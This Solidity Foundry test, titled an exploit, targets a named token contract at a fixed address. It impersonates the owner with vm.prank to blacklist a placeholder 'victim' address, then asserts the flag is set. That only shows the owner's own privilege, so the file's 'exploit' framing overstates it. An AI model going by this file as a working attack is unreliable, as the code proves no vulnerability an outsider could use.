// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IOpti {
    function owner() external view returns (address);
    function setBotBlacklist(address _botAddress, bool _flag) external;
    function blacklist(address) external view returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xb5D5D9C8E98cef68E7bdAd92b1De229d514179b6;
    address attacker = address(this);
    IOpti opti;
    address owner;
    address constant VICTIM_CONTRACT = address(0xDeaDbeefdEAdbeefdEadbEEFdeadbeEFdEaDbeeF);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        opti = IOpti(TARGET);
        owner = opti.owner();

        vm.label(TARGET, "OptiFi Token");
        vm.label(owner, "Contract Owner");
        vm.label(VICTIM_CONTRACT, "Victim Contract");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        vm.prank(owner);
                opti.setBotBlacklist(VICTIM_CONTRACT, true);

                // --- ORACLE VERIFICATION ---
                assertEq(opti.blacklist(VICTIM_CONTRACT), true);
        assertEq(opti.blacklist(VICTIM_CONTRACT), true, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
